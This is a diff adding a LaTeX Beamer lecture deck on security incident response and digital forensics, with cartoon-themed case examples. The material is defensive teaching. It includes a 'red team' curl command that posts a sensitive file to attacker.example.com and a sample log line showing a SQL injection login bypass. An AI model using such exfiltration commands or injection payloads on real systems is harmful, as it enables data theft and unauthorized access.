@@ -1,0 +1,764 @@
+\documentclass{beamer}
+\usetheme{Madrid}
+\usecolortheme{beaver}
+\usepackage{graphicx}
+\usepackage{hyperref}
+
+\title{Information Security Incident Response}
+\subtitle{Fundamentals and Best Practices}
+\author{Brendan Shea, PhD}
+\institute{Department of Computer Science}
+\date{\today}
+
+\begin{document}
+
+\begin{frame}
+\titlepage
+\end{frame}
+
+\begin{frame}
+\frametitle{Introduction to Incident Response: Protecting Digital Assets}
+\begin{itemize}
+\item \textbf{Security incidents} are events that compromise the confidentiality, integrity, or availability of information systems and data.
+\item Incident Response (IR) is a structured methodology for addressing and managing the aftermath of security breaches or attacks.
+\item Effective incident response minimizes damage, reduces recovery time, and decreases the overall cost of a security incident.
+\item Organizations with mature incident response capabilities experience 72\% lower costs from security breaches.
+\end{itemize}
+
+\begin{alertblock}{Key Concept}
+Incident response is not just reactive—it includes preparation and preventive measures that happen before incidents occur.
+\end{alertblock}
+\end{frame}
+
+\begin{frame}
+\frametitle{The Incident Response Lifecycle: An Overview}
+\begin{itemize}
+\item The incident response lifecycle consists of seven interconnected phases that form a continuous improvement cycle.
+\item Each phase builds upon the previous one to create a comprehensive approach to security incident management.
+\item The process begins with preparation long before an incident occurs and concludes with lessons that improve future responses.
+\item Following a structured approach ensures that important steps are not missed during the stress of an active incident.
+\end{itemize}
+
+\begin{center}
+\begin{tabular}{|l|l|}
+\hline
+\textbf{Phase} & \textbf{Primary Goal} \\
+\hline
+Preparation & Establish capabilities before incidents occur \\
+Detection & Identify potential security incidents quickly \\
+Analysis & Determine scope, impact, and response strategy \\
+Containment & Limit damage and prevent further spread \\
+\hline
+\end{tabular}
+\end{center}
+\end{frame}
+
+\begin{frame}
+\frametitle{Preparation Phase: Building Your Security Foundation}
+\begin{itemize}
+\item \textbf{Preparation} involves developing the necessary procedures, tools, and resources needed before security incidents occur.
+\item A formal incident response plan documents roles, responsibilities, communication strategies, and escalation procedures.
+\item Technical preparation includes deployment of security tools, establishing baselines, and creating response playbooks.
+\item Organizational preparation requires executive support, adequate funding, and clear authority for the incident response team.
+\end{itemize}
+
+\begin{exampleblock}{Example: IR Plan Components}
+\begin{itemize}
+\item Incident classification matrix
+\item Contact information for all stakeholders
+\item Communication templates
+\item Decision-making authority guidelines
+\end{itemize}
+\end{exampleblock}
+\end{frame}
+
+
+\begin{frame}
+\frametitle{Detection Mechanisms: Identifying Security Incidents}
+\begin{itemize}
+\item \textbf{Detection} is the process of identifying potential security incidents through both automated and manual means.
+\item Security tools like SIEM systems, IDS/IPS, and EDR solutions provide automated detection capabilities for known threat patterns.
+\item Human detection often comes from end users reporting suspicious activities or security personnel identifying anomalies.
+\item Effective detection requires establishing baselines of normal behavior to recognize deviations that may indicate security incidents.
+\end{itemize}
+
+\begin{block}{Detection Time Matters}
+The average time to detect a breach is 207 days, but organizations with mature detection capabilities can reduce this to hours or minutes, significantly limiting potential damage.
+\end{block}
+\end{frame}
+
+\begin{frame}
+\frametitle{Incident Analysis: Making Sense of Security Events}
+\begin{itemize}
+\item \textbf{Analysis} involves examining available evidence to understand the nature, scope, and impact of a security incident.
+\item Initial triage determines if an event is a genuine security incident and estimates its severity to prioritize response efforts.
+\item Technical analysis examines logs, network traffic, and affected systems to identify attack vectors and compromised assets.
+\item Impact analysis assesses potential business, operational, and legal consequences to guide containment and recovery decisions.
+\end{itemize}
+
+\begin{alertblock}{Critical Questions During Analysis}
+\begin{itemize}
+\item What systems and data have been compromised?
+\item How did the attackers gain access?
+\item Are attackers still present in the environment?
+\item What is the potential impact to the organization?
+\end{itemize}
+\end{alertblock}
+\end{frame}
+
+\begin{frame}[fragile]
+\frametitle{Containment Strategies: Limiting the Damage}
+\begin{itemize}
+\item \textbf{Containment} focuses on preventing the incident from spreading further within the organization's environment.
+\item Short-term containment implements immediate measures to limit damage, such as isolating affected systems from the network.
+\item Long-term containment applies temporary fixes to allow systems to be used in production while final remediation is developed.
+\item Containment decisions balance security needs with business continuity requirements to minimize operational impact.
+\end{itemize}
+
+\begin{exampleblock}{Containment Techniques}
+\begin{semiverbatim}
+# Network isolation command example
+$ iptables -A INPUT -s <malicious_IP> -j DROP
+$ iptables -A OUTPUT -d <malicious_IP> -j DROP
+\end{semiverbatim}
+\end{exampleblock}
+\end{frame}
+
+\begin{frame}
+\frametitle{Eradication Techniques: Removing the Threat}
+\begin{itemize}
+\item \textbf{Eradication} involves completely removing the threat from all affected systems in the environment.
+\item Identifying all affected systems requires thorough analysis of indicators of compromise (IOCs) across the environment.
+\item Removal techniques include patching vulnerabilities, cleaning infected systems, or rebuilding systems from trusted images.
+\item After initial eradication, verification procedures confirm that all malicious components have been successfully removed.
+\end{itemize}
+
+\begin{center}
+\begin{tabular}{|l|l|}
+\hline
+\textbf{Eradication Method} & \textbf{When to Use} \\
+\hline
+Patching & Exploitation of known vulnerability \\
+Malware removal & Limited malware infection \\
+System rebuilding & Deep compromise or backdoors \\
+User account reset & Compromised credentials \\
+\hline
+\end{tabular}
+\end{center}
+\end{frame}
+
+\begin{frame}
+\frametitle{Recovery Procedures: Returning to Normal Operations}
+\begin{itemize}
+\item \textbf{Recovery} focuses on restoring affected systems and services to normal operation in a secure manner.
+\item Systems should be restored in a prioritized order based on business criticality and dependencies between systems.
+\item Enhanced monitoring is implemented during recovery to detect any signs of persistent access or reinfection attempts.
+\item Recovery is complete when systems return to normal operations with verification that security controls are functioning properly.
+\end{itemize}
+
+\begin{block}{Recovery Time Objective (RTO)}
+The \textbf{Recovery Time Objective} defines the maximum acceptable time to restore a system after an incident, balancing business needs with security requirements.
+\end{block}
+\end{frame}
+
+\begin{frame}
+\frametitle{Lessons Learned: Evolving Your Security Posture}
+\begin{itemize}
+\item The \textbf{Lessons Learned} phase transforms incident experiences into organizational knowledge that improves future security.
+\item Post-incident reviews should occur within two weeks of incident resolution while details are still fresh in team members' minds.
+\item Effective reviews focus on process improvements rather than assigning blame, creating a safe environment for honest discussion.
+\item Findings should be documented and translated into specific, actionable improvements with assigned responsibilities and deadlines.
+\end{itemize}
+
+\begin{exampleblock}{Key Post-Incident Questions}
+\begin{itemize}
+\item What detection mechanisms worked/failed?
+\item Were response procedures followed effectively?
+\item What could have prevented the incident?
+\item How can we reduce future impact/recovery time?
+\end{itemize}
+\end{exampleblock}
+\end{frame}
+
+\begin{frame}
+\frametitle{Building an Effective Incident Response Team}
+\begin{itemize}
+\item An effective \textbf{Incident Response Team} combines technical expertise with clear roles, responsibilities, and authority.
+\item Core team members often include security analysts, system administrators, network engineers, and legal/communications specialists.
+\item The team structure can be centralized, distributed, or hybrid depending on organizational size and geographic distribution.
+\item Clear escalation paths and decision-making authority are critical for rapid response during active incidents.
+\end{itemize}
+
+\begin{center}
+\begin{tabular}{|l|l|}
+\hline
+\textbf{Role} & \textbf{Primary Responsibility} \\
+\hline
+Incident Commander & Overall coordination and decision-making \\
+Technical Lead & Directing technical response activities \\
+Communications Lead & Stakeholder and external communications \\
+Documentation Specialist & Recording actions and maintaining evidence \\
+\hline
+\end{tabular}
+\end{center}
+\end{frame}
+
+\begin{frame}
+\frametitle{Incident Response Training: Developing Security Skills}
+\begin{itemize}
+\item \textbf{Training} ensures that incident response team members develop and maintain the necessary skills for effective response.
+\item Technical training covers tools, techniques, and procedures specific to the organization's security technology stack.
+\item Process training ensures team members understand their roles, responsibilities, and the incident response workflow.
+\item Specialized training in areas like digital forensics, malware analysis, and threat hunting creates depth of expertise.
+\end{itemize}
+
+\begin{alertblock}{Training Requirements}
+Incident response team members should receive at least 40 hours of specialized security training annually to maintain skills and stay current with evolving threats and technologies.
+\end{alertblock}
+\end{frame}
+
+\begin{frame}
+\frametitle{Testing Your Incident Response Plan: Tabletop Exercises}
+\begin{itemize}
+\item \textbf{Tabletop exercises} are discussion-based sessions where team members talk through their response to simulated scenarios.
+\item These exercises validate roles, responsibilities, and decision-making processes without disrupting production systems.
+\item Effective scenarios should be realistic, relevant to the organization's threat profile, and increase in complexity over time.
+\item Exercises should include representatives from all stakeholder groups involved in incident response, including executive leadership.
+\end{itemize}
+
+\begin{exampleblock}{Sample Tabletop Scenario}
+The security team has detected unusual outbound network traffic from several servers in the finance department occurring outside business hours. Initial investigation suggests possible data exfiltration. How would your team respond?
+\end{exampleblock}
+\end{frame}
+
+\begin{frame}[fragile]
+\frametitle{Simulation Exercises: Real-World Response Practice}
+\begin{itemize}
+\item \textbf{Simulation exercises} provide hands-on practice by introducing real artifacts of security incidents in controlled environments.
+\item Technical simulations may include responding to actual malware in isolated lab environments or detecting planted indicators of compromise.
+\item Full-scale simulations test the entire incident response process from detection through recovery with realistic time pressures.
+\item These exercises should be conducted at least annually with findings incorporated into improved procedures and additional training.
+\end{itemize}
+
+\begin{exampleblock}{Red Team Command Example}
+\scriptsize
+\begin{semiverbatim}
+# Simulated data exfiltration command
+$ curl -X POST -d @sensitive_data.txt https://attacker.example.com
+\end{semiverbatim}
+\end{exampleblock}
+\end{frame}
+
+\begin{frame}
+\frametitle{Root Cause Analysis: Finding the Source of Security Incidents}
+\begin{itemize}
+\item \textbf{Root Cause Analysis (RCA)} is a systematic process for identifying the fundamental reasons why an incident occurred.
+\item Effective RCA looks beyond the immediate technical cause to identify organizational, procedural, and systemic factors.
+\item The "5 Whys" technique involves asking "why" multiple times to drill down from symptoms to underlying causes.
+\item Addressing root causes, rather than just symptoms, prevents similar incidents from recurring in the future.
+\end{itemize}
+
+\begin{block}{Root Cause Categories}
+\scriptsize
+\begin{itemize}
+\item Technical: Vulnerabilities, misconfigurations, bugs
+\item Process: Inadequate procedures, unclear responsibilities
+\item People: Training gaps, human error, malicious actions
+\item Environmental: Third-party dependencies, system interactions
+\end{itemize}
+\end{block}
+\end{frame}
+
+\begin{frame}
+\frametitle{Threat Hunting Fundamentals: Proactive Security}
+\begin{itemize}
+\item \textbf{Threat hunting} is the proactive search for malicious activity that has evaded existing security controls.
+\item Unlike monitoring, hunting starts with a hypothesis about potential attacker techniques rather than waiting for alerts.
+\item Effective hunting requires deep knowledge of normal system behavior to identify subtle anomalies and potential threats.
+\item Hunting findings improve detection capabilities by identifying gaps in existing security controls and creating new detection rules.
+\end{itemize}
+
+\begin{alertblock}{The MITRE ATT\&CK Framework}
+\scriptsize
+The MITRE ATT\&CK Framework provides a comprehensive knowledge base of adversary tactics and techniques that serves as an excellent foundation for developing threat hunting hypotheses.
+\end{alertblock}
+\end{frame}
+
+
+\begin{frame}
+\frametitle{Introduction to Digital Forensics: Legal and Technical Foundations}
+\begin{itemize}
+\item \textbf{Digital forensics} is the application of scientific methods to recover and investigate digital evidence for legal purposes.
+\item Forensic investigations must maintain the integrity of evidence while extracting actionable information about security incidents.
+\item The forensic process must be documented, repeatable, and defensible to ensure findings can be used in legal proceedings if necessary.
+\item Digital forensics supports incident response by providing detailed information about attack methods and affected systems.
+\end{itemize}
+
+\begin{block}{Digital Forensics vs. Incident Response}
+\scriptsize
+While incident response focuses primarily on containing and remediating security incidents, digital forensics emphasizes evidence collection and preservation methods that support potential legal action.
+\end{block}
+\end{frame}
+
+\begin{frame}
+\frametitle{Legal Hold Requirements: Preserving Digital Evidence}
+\begin{itemize}
+\item A \textbf{legal hold} is a process to preserve all forms of relevant information when litigation is reasonably anticipated.
+\item Organizations must suspend normal data deletion and implement preservation measures when security incidents may involve legal issues.
+\item Legal holds require coordination between IT, security, legal, and records management teams to ensure comprehensive preservation.
+\item The scope of preservation should be broad initially and may be narrowed as the investigation proceeds and facts become clearer.
+\end{itemize}
+
+\begin{alertblock}{Key Legal Hold Considerations}
+\scriptsize
+When implementing a legal hold, document the scope, timing, and notification process. Failure to preserve evidence can result in legal sanctions, including adverse inference instructions to juries.
+\end{alertblock}
+\end{frame}
+
+\begin{frame}
+\scriptsize
+\frametitle{Chain of Custody: Maintaining Evidence Integrity}
+\begin{itemize}
+\item \textbf{Chain of custody} documents the chronological history of evidence, showing who possessed it and what actions were performed on it.
+\item Proper documentation includes details about collection date/time, collector identity, location, storage methods, and transfers between individuals.
+\item Digital evidence should be handled in ways that minimize changes to preserve its authenticity and admissibility in legal proceedings.
+\item Chain of custody documentation should be maintained from initial collection through final disposition of all evidence.
+\end{itemize}
+
+\begin{exampleblock}{Chain of Custody Documentation}
+\scriptsize
+\begin{center}
+\begin{tabular}{|l|l|}
+\hline
+\textbf{Element} & \textbf{Required Information} \\
+\hline
+Evidence ID & Unique identifier for the evidence item \\
+Handler & Name and role of each person handling evidence \\
+Timestamps & Date/time of collection and each transfer \\
+Actions & Any analysis or processing performed \\
+\hline
+\end{tabular}
+\end{center}
+\end{exampleblock}
+\end{frame}
+
+
+\begin{frame}[fragile]
+\frametitle{Example: Addams Family Digital Forensics - Chain of Custody}
+\scriptsize
+\begin{itemize}
+\item The Addams Family Forensics Consulting was hired to investigate a ransomware incident at Westfield Hospital.
+\item Morticia Addams led the evidence collection process, ensuring proper documentation of all digital artifacts acquired from infected systems.
+\item Gomez Addams maintained detailed chain of custody records for all storage devices, backup tapes, and network equipment removed for analysis.
+\item Wednesday Addams conducted memory forensics on critical servers, identifying the ransomware variant and potential patient data exposure.
+\end{itemize}
+
+\begin{exampleblock}{Addams Family Chain of Custody Document}
+\begin{semiverbatim}
+Evidence Item: HP-SRV01-DRIVE1
+Date/Time: 2025-03-07 23:13 
+Collected by: Morticia Addams, Lead Investigator
+Location: Server Room B, Main Rack, Position 3
+Description: 2TB SSD from primary patient records server
+Hash: e7d7d7ac8125d8abe6da7d269f02f048e2c2a42e1251
+Transfer: 
+2025-03-07 23:45 - Wednesday Addams, Forensic Analyst
+2025-03-08 09:15 - Lurch, Evidence Custodian
+"You called for evidence?"
+\end{semiverbatim}
+\end{exampleblock}
+\end{frame}
+
+
+
+\begin{frame}[fragile]
+\frametitle{Evidence Acquisition: Capturing Digital Artifacts}
+\begin{itemize}
+\item \textbf{Acquisition} is the process of creating forensically sound copies of digital evidence while maintaining data integrity.
+\item Write blockers are used during acquisition to prevent inadvertent modification of original evidence during the copying process.
+\item Cryptographic hashes verify that forensic copies are exact duplicates of the original data, establishing authenticity.
+\item Acquisition methods vary based on the evidence type, ranging from disk imaging to memory dumps and network traffic capture.
+\end{itemize}
+
+\begin{exampleblock}{Disk Imaging Command}
+\scriptsize
+\begin{semiverbatim}
+# Create forensic image with verification
+$ dd if=/dev/sda bs=512 | \\
+tee evidence.img | sha256sum > evidence.sha256
+\end{semiverbatim}
+\end{exampleblock}
+\end{frame}
+
+\begin{frame}
+\frametitle{Forensic Analysis: Extracting Actionable Intelligence}
+\begin{itemize}
+\item \textbf{Forensic analysis} examines collected evidence to reconstruct events, identify attack methods, and assess system compromise.
+\item Timeline analysis correlates events across multiple data sources to build a chronological history of the incident.
+\item Artifact analysis examines specific system components like registry entries, log files, and filesystem metadata for evidence of malicious activity.
+\item Memory analysis can reveal malware, encryption keys, and network connections not visible in persistent storage analysis.
+\end{itemize}
+
+\begin{block}{Important Forensic Artifacts}
+\scriptsize
+\begin{itemize}
+\item Windows: Registry, Event Logs, Prefetch files, MFT
+\item Linux: Auth logs, Bash history, /proc filesystem
+\item Network: DHCP leases, DNS cache, ARP tables
+\item Web: Browser history, cookies, cached content
+\end{itemize}
+\end{block}
+\end{frame}
+
+\begin{frame}
+\frametitle{Forensic Reporting: Documenting Your Findings}
+\begin{itemize}
+\item \textbf{Forensic reports} document investigative findings in a clear, objective, and defensible manner for various stakeholders.
+\item Technical reports provide detailed analysis and evidence for security teams to improve defenses and response capabilities.
+\item Executive reports summarize key findings, business impact, and recommendations without technical jargon for leadership decisions.
+\item Legal reports focus on evidence admissibility, attack attribution, and elements that support potential legal proceedings.
+\end{itemize}
+
+\begin{alertblock}{Effective Forensic Reports}
+\scriptsize
+Forensic reports should clearly distinguish between facts, investigative methods, and analyst opinions or conclusions to maintain credibility and usefulness in legal contexts.
+\end{alertblock}
+\end{frame}
+
+\begin{frame}
+\frametitle{Evidence Preservation: Long-term Storage Considerations}
+\begin{itemize}
+\item \textbf{Evidence preservation} ensures digital evidence remains intact and accessible for as long as needed for legal or security purposes.
+\item Preservation timeframes vary based on legal requirements, ranging from months for routine incidents to years for major breaches.
+\item Storage solutions must maintain evidence integrity through encryption, access controls, and protection from environmental hazards.
+\item Regular validation of preserved evidence ensures it remains accessible and uncorrupted throughout the required retention period.
+\end{itemize}
+
+\begin{exampleblock}{Evidence Storage Best Practices}
+
+\scriptsize
+\begin{itemize}
+\item Store at least two copies in separate physical locations
+\item Use write-once media or immutable storage solutions
+\item Implement strong access controls with detailed logs
+\item Verify evidence integrity through periodic hash verification
+\end{itemize}
+\end{exampleblock}
+\end{frame}
+
+\begin{frame}
+\frametitle{E-Discovery: Supporting Legal Proceedings}
+\begin{itemize}
+\item \textbf{E-Discovery} is the process of identifying, collecting, and producing electronically stored information in response to legal requests.
+\item The Electronic Discovery Reference Model (EDRM) provides a framework for handling digital evidence in legal contexts.
+\item Organizations must balance broad preservation early in investigations with targeted collection as case specifics become clearer.
+\item Early case assessment helps estimate the scope, cost, and effort required for e-discovery to inform legal strategy.
+\end{itemize}
+
+\begin{center}
+\scriptsize
+\begin{tabular}{|l|p{5cm}|}
+\hline
+\textbf{EDRM Phase} & \textbf{Key Activities} \\
+\hline
+Information Governance & Managing data from creation to disposal \\
+Identification & Locating potential sources of relevant data \\
+Preservation & Ensuring relevant data is protected from alteration \\
+Collection & Gathering data for further processing and review \\
+\hline
+\end{tabular}
+\end{center}
+\end{frame}
+
+
+\begin{frame}
+\frametitle{The Power of Log Data in Investigations}
+\begin{itemize}
+\item \textbf{Log data} provides a recorded history of events that occurred within systems, applications, and networks over time.
+\item Effective log management requires centralized collection, consistent time synchronization, and appropriate retention periods.
+\item Logs serve as a primary source of evidence in security investigations, providing details about what happened and when.
+\item The most valuable logs contain information about authentication events, access control decisions, and system state changes.
+\end{itemize}
+
+\begin{alertblock}{Log Management Challenges}
+\scriptsize
+Organizations face significant challenges in log management, including high volumes (often terabytes per day), diverse formats, storage costs, and the need to balance detail with performance impact.
+\end{alertblock}
+\end{frame}
+
+\begin{frame}[fragile]
+\frametitle{Firewall Logs: Monitoring Network Boundaries}
+\begin{itemize}
+\item \textbf{Firewall logs} record allowed and blocked connection attempts at network boundaries, helping identify unauthorized access attempts.
+\item Key fields include source/destination IP addresses, ports, protocols, timestamp, and the action taken (allow/deny).
+\item Stateful firewalls may log connection states (new, established, related) providing context about traffic flows over time.
+\item Analysis of denied connections can reveal reconnaissance activities and potential exploitation attempts by attackers.
+\end{itemize}
+
+\begin{exampleblock}{Sample Firewall Log Entry}
+\scriptsize
+\begin{semiverbatim}
+Mar 10 15:22:43 fw01 kernel: BLOCK IN=eth0 OUT= 
+MAC=00:16:3e:2f:29:c1 SRC=198.51.100.12 DST=10.0.1.5 
+LEN=60 TOS=0x00 TTL=63 ID=57422 PROTO=TCP 
+SPT=45892 DPT=22 WINDOW=64240 SYN
+\end{semiverbatim}
+\end{exampleblock}
+\end{frame}
+
+\begin{frame}[fragile]
+    \scriptsize
+\frametitle{Example: Mystery Inc. Security Team - Firewall Log Analysis}
+\begin{itemize}
+\item The Mystery Inc. cybersecurity team discovered suspicious network traffic while investigating a breach at Coolsville Industries.
+\item Velma Dinkley identified patterns in the firewall logs showing reconnaissance attempts from a suspicious IP address.
+\item The team correlated the logs with previous incidents to establish a timeframe for the initial compromise.
+\item Fred Jones implemented enhanced firewall rules to block the malicious IP range and prevent further reconnaissance.
+\end{itemize}
+
+\begin{exampleblock}{Mystery Inc. Firewall Log Excerpt}
+\begin{semiverbatim}
+2025-03-05 02:13:45 DENY TCP 198.51.100.73:45122 -> 10.0.3.25:22 
+flags=S len=44 
+2025-03-05 02:13:47 DENY TCP 198.51.100.73:45123 -> 10.0.3.26:22 
+flags=S len=44
+2025-03-05 02:13:48 DENY TCP 198.51.100.73:45124 -> 10.0.3.27:22 
+flags=S len=44
+Velma: "Jinkies! This is a clear SSH port scan pattern!"
+\end{semiverbatim}
+\end{exampleblock}
+\end{frame}
+
+
+\begin{frame}
+\frametitle{Application Logs: Tracking Software Behavior}
+\begin{itemize}
+\item \textbf{Application logs} record events and transactions within software systems, providing visibility into user actions and system processes.
+\item Web server logs track HTTP requests, including client IP addresses, requested resources, response codes, and user agents.
+\item Database logs record queries, schema changes, and authentication events that may indicate data exfiltration or manipulation.
+\item Authentication logs show successful and failed login attempts, password changes, and privilege escalations across applications.
+\end{itemize}
+
+\begin{block}{Key Application Log Elements}
+\scriptsize
+\begin{itemize}
+\item Timestamp with timezone information
+\item User identity and source IP address
+\item Action performed or attempted
+\item Resource accessed or affected
+\item Result of the action (success/failure)
+\end{itemize}
+\end{block}
+\end{frame}
+
+\begin{frame}[fragile]
+\frametitle{Example: Planet Express Security - Application Log Analysis}
+\scriptsize
+\begin{itemize}
+\item The Planet Express security team detected unauthorized access to their package tracking system through web application login anomalies.
+\item Bender Rodríguez identified suspicious login patterns where users were successfully authenticated despite providing incorrect passwords.
+\item Professor Farnsworth analyzed the application logs, discovering SQL injection attempts that bypassed authentication controls.
+\item Leela implemented immediate containment, applying a web application firewall rule to block the malicious input patterns.
+\end{itemize}
+
+\begin{exampleblock}{Planet Express Web Application Logs}
+\begin{semiverbatim}
+[2025-03-10T14:22:31] [app-srv-42] [INFO] Login attempt: 
+user=delivery_admin ip=203.0.113.42 status=SUCCESS
+[2025-03-10T14:22:33] [app-srv-42] [DEBUG] SQL query: 
+SELECT * FROM users WHERE username='delivery_admin' 
+AND password='' OR '1'='1' --'
+[2025-03-10T14:22:35] [app-srv-42] [WARN] Admin accessed 
+customer database from unusual location
+Bender: "Bite my shiny metal SQL injection!"
+\end{semiverbatim}
+\end{exampleblock}
+\end{frame}
+
+\begin{frame}
+\frametitle{Endpoint Logs: Understanding Device Activity}
+\begin{itemize}
+\item \textbf{Endpoint logs} provide detailed information about activities occurring on individual devices like workstations and servers.
+\item Process execution logs record application launches, including execution path, command-line arguments, and parent processes.
+\item File system logs track file creation, modification, and deletion events that may indicate malware installation or data theft.
+\item Network connection logs from endpoints reveal which processes are communicating with external systems and potential command and control channels.
+\end{itemize}
+
+\begin{exampleblock}{Endpoint Detection and Response (EDR)}
+\scriptsize
+Modern EDR solutions combine real-time monitoring, behavioral analytics, and threat intelligence to provide comprehensive visibility into endpoint activity, substantially enhancing security teams' investigative capabilities.
+\end{exampleblock}
+\end{frame}
+
+\begin{frame}
+\frametitle{OS Security Logs: System-Level Monitoring}
+\begin{itemize}
+\item \textbf{OS security logs} record system-level security events like user authentication, privilege use, and security policy changes.
+\item Windows Event Logs capture security events in a structured format with event IDs that correspond to specific types of activities.
+\item Linux audit logs track system calls, providing detailed visibility into process activities and security-relevant operations.
+\item Configuring appropriate logging levels requires balancing security visibility with system performance and storage requirements.
+\end{itemize}
+
+\begin{center}
+\scriptsize
+\begin{tabular}{|l|l|l|}
+\hline
+\textbf{Windows Event ID} & \textbf{Description} & \textbf{Security Relevance} \\
+\hline
+4624 & Successful logon & Authentication monitoring \\
+4625 & Failed logon & Brute force detection \\
+4698 & Scheduled task created & Persistence mechanism \\
+4720 & User account created & Account management \\
+\hline
+\end{tabular}
+\end{center}
+\end{frame}
+
+\begin{frame}[fragile]
+\frametitle{IPS/IDS Logs: Identifying Attack Patterns}
+\begin{itemize}
+\item \textbf{Intrusion Prevention/Detection System (IPS/IDS) logs} record attempted or successful exploitation of vulnerabilities.
+\item Signature-based detection triggers alerts when traffic matches known attack patterns or malicious payloads.
+\item Anomaly-based detection identifies deviations from baseline behavior that may indicate novel attack techniques.
+\item IPS/IDS logs include rich context like attack classification, severity rating, and references to known vulnerabilities.
+\end{itemize}
+
+\begin{exampleblock}{Sample Snort IDS Alert}
+\scriptsize
+\begin{semiverbatim}
+[**] [1:1000001:1] SQL Injection Attempt [**]
+[Classification: Web Application Attack] [Priority: 1]
+03/10-14:22:17.524613 192.168.1.100:49812 -> 10.0.0.15:80
+TCP TTL:64 TOS:0x0 ID:20095 IpLen:20 DgmLen:725
+***AP*** Seq: 0x6D57A73F Ack: 0x9B5CF4D Win: 0x7210
+\end{semiverbatim}
+\end{exampleblock}
+\end{frame}
+
+
+\begin{frame}
+\frametitle{Example: TMNT SOC - IDS Alert Correlation}
+\begin{itemize}
+\item The Teenage Mutant Ninja Turtles Security Operations Center (TMNT SOC) detected a potential data exfiltration attempt at April O'Neil's news network.
+\item Donatello correlated IDS alerts with application logs to identify unusual database access patterns from an authenticated user account.
+\item Leonardo led the incident response team through the containment process, isolating affected systems while maintaining critical services.
+\item Raphael and Michelangelo conducted a root cause analysis, tracing the attack to a phishing email that compromised a journalist's credentials.
+\end{itemize}
+
+\begin{alertblock}{TMNT Incident Summary}
+The TMNT team identified that an adversary had been accessing the news database for 3 days, exfiltrating sensitive interview notes and source information using DNS tunneling to avoid standard data loss prevention controls. The attack chain began with a targeted phishing email appearing to come from a trusted source.
+\end{alertblock}
+\end{frame}
+
+\begin{frame}
+\frametitle{Network Traffic Analysis: Understanding Communication Flows}
+\begin{itemize}
+\item \textbf{Network traffic analysis} examines data moving between systems to identify suspicious communications and data movement.
+\item Netflow records provide summarized traffic information including source/destination addresses, ports, protocols, and data volumes.
+\item Full packet capture allows detailed inspection of actual data transferred but requires significant storage and processing resources.
+\item Encrypted traffic analysis uses metadata and traffic patterns to identify threats even when payload contents are not accessible.
+\end{itemize}
+
+\begin{block}{Network Traffic Analysis Levels}
+\scriptsize
+\begin{itemize}
+\item Flow data: Connection metadata only (who talked to whom)
+\item Protocol analysis: Communication structure without content
+\item Deep packet inspection: Full content analysis
+\item Behavioral analysis: Pattern recognition across traffic
+\end{itemize}
+\end{block}
+\end{frame}
+
+\begin{frame}
+\frametitle{Metadata: The Data About Your Data}
+\begin{itemize}
+\item \textbf{Metadata} provides contextual information about files, communications, and systems that is often critical in investigations.
+\item File metadata includes creation, modification, and access timestamps, owner information, and application-specific details.
+\item Email metadata contains sender/recipient information, relay servers, subject lines, and attachment details separate from message content.
+\item Metadata often persists even when content is deleted or modified, providing valuable forensic artifacts for investigators.
+\end{itemize}
+
+\begin{alertblock}{Metadata Investigative Value}
+\scriptsize
+In many investigations, metadata proves more valuable than content because it establishes patterns, relationships, and timelines that would not be apparent from examining content alone.
+\end{alertblock}
+\end{frame}
+
+
+\begin{frame}
+\frametitle{Vulnerability Scan Results: Finding Security Weaknesses}
+\begin{itemize}
+\item \textbf{Vulnerability scan results} identify security weaknesses in systems and applications that could be exploited by attackers.
+\item Historical scan data helps investigators determine if a specific vulnerability existed at the time of an incident and was potentially exploited.
+\item Comparing pre-incident and post-incident scan results can reveal unauthorized system changes and new security weaknesses.
+\item Vulnerability information provides context about attack difficulty, potential impact, and exploitation techniques.
+\end{itemize}
+
+\begin{exampleblock}{Common Vulnerability Scoring System (CVSS)}
+\scriptsize
+The CVSS provides a standardized framework for assessing vulnerability severity based on exploitability factors (attack vector, complexity, privileges required) and impact factors (confidentiality, integrity, availability).
+\end{exampleblock}
+\end{frame}
+
+\begin{frame}
+\frametitle{Leveraging Automated Security Reports}
+\begin{itemize}
+\item \textbf{Automated security reports} from various tools provide regular assessments of security posture and potential issues.
+\item Antimalware reports document detected threats, affected systems, and remediation actions taken before a full incident developed.
+\item Data Loss Prevention (DLP) reports track sensitive data movement and potential exfiltration attempts across the environment.
+\item User behavior analytics reports highlight unusual activity patterns that may indicate compromised accounts or insider threats.
+\end{itemize}
+
+\begin{center}
+\scriptsize
+\begin{tabular}{|l|l|}
+\hline
+\textbf{Report Type} & \textbf{Investigation Value} \\
+\hline
+Phishing campaign results & Identify initial access vectors \\
+Password policy violations & Discover credential weaknesses \\
+Patch management status & Reveal vulnerable systems \\
+Cloud security posture & Detect misconfigurations \\
+\hline
+\end{tabular}
+\end{center}
+\end{frame}
+
+\begin{frame}
+\frametitle{Security Dashboards: Visualizing Threat Data}
+\begin{itemize}
+\item \textbf{Security dashboards} aggregate and visualize data from multiple sources to provide situational awareness during investigations.
+\item Real-time dashboards display current security status and ongoing incidents, supporting active response operations.
+\item Trend dashboards show patterns over time, helping identify slow-developing attacks and gradual security degradation.
+\item Relationship dashboards reveal connections between entities (users, systems, files) that may not be apparent in raw data.
+\end{itemize}
+
+\begin{block}{Effective Dashboard Design}
+Security dashboards should prioritize actionable information over raw data, use appropriate visualization techniques for different data types, and allow investigators to drill down from high-level overviews to detailed evidence.
+\end{block}
+\end{frame}
+
+\begin{frame}[fragile]
+\frametitle{Case Studies: Applying Incident Response in Real Scenarios}
+\begin{itemize}
+\item \textbf{Case studies} demonstrate how incident response principles and techniques apply to real-world security incidents.
+\item Analyzing past incidents shows how different response approaches affect containment time, recovery costs, and overall damage.
+\item Industry-specific case studies help organizations understand threats relevant to their sector and appropriate response strategies.
+\item Learning from others' experiences allows security teams to prepare for similar incidents before they occur.
+\end{itemize}
+
+\begin{exampleblock}{Ransomware Case Study}
+\scriptsize
+\begin{semiverbatim}
+Timeline:
+T+0h: Initial phishing email received
+T+2h: Malicious attachment opened, initial access
+T+6h: Lateral movement begins
+T+24h: Encryption process initiated
+T+26h: Detection via monitoring alert
+T+48h: Full recovery completed from backups
+\end{semiverbatim}
+\end{exampleblock}
+\end{frame}
+\end{document}
